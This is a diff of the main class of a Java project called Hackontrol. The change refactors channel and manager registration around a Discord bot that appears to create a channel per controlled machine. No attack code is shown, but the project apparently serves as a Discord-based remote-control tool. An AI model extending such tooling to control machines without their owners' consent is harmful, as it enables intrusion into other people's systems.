@@ -11,9 +11,9 @@ import com.khopan.hackontrol.manager.Manager;
 import com.khopan.hackontrol.registration.ChannelRegistry;
 import com.khopan.hackontrol.registration.ManagerRegistry;
 import com.khopan.hackontrol.registry.ClassRegistration;
-import com.khopan.hackontrol.registry.RegistrationHandler;
 import com.khopan.hackontrol.registry.RegistryType;
 import com.khopan.hackontrol.registry.implementation.FilteredTypeRegistry;
+import com.khopan.hackontrol.registry.implementation.RegistryImplementation;
 import com.khopan.hackontrol.utils.ErrorHandler;
 
 import net.dv8tion.jda.api.JDA;
@@ -42,7 +42,6 @@ public class Hackontrol {
 
 	private final List<Manager> managerList;
 	private final List<HackontrolChannel> channelList;
-	private final RegistrationHandler registrationHandler;
 	private final JDA bot;
 	private final Guild guild;
 	private final String machineIdentifier;
@@ -63,7 +62,6 @@ public class Hackontrol {
 			Hackontrol.LOGGER.info("Registered channel: {}", channel.getClass().getName());
 		}
 
-		this.registrationHandler = new RegistrationHandler();
 		JDABuilder builder = JDABuilder.createDefault(Token.BOT_TOKEN).enableIntents(GatewayIntent.MESSAGE_CONTENT);
 
 		for(int i = 0; i < this.managerList.size(); i++) {
@@ -88,7 +86,7 @@ public class Hackontrol {
 			channel.hackontrol = this;
 			channel.category = this.category;
 			channel.channel = textChannel;
-			channel.preInitialize(this.registrationHandler.createRegistry(channel));
+			channel.preInitialize(RegistryImplementation.of(channel));
 
 			if(this.isChannelEmpty(textChannel)) {
 				channel.initialize();
@@ -100,7 +98,7 @@ public class Hackontrol {
 		for(int i = 0; i < this.managerList.size(); i++) {
 			Manager manager = this.managerList.get(i);
 			Hackontrol.LOGGER.info("Initializing manager: {}", manager.getClass().getName());
-			manager.initialize(this.registrationHandler);
+			manager.initialize();
 		}
 	}
 
@@ -207,10 +205,6 @@ public class Hackontrol {
 		}
 
 		return null;
-	}
-
-	public RegistrationHandler getRegistrationHandler() {
-		return this.registrationHandler;
 	}
 
 	public JDA getBot() {
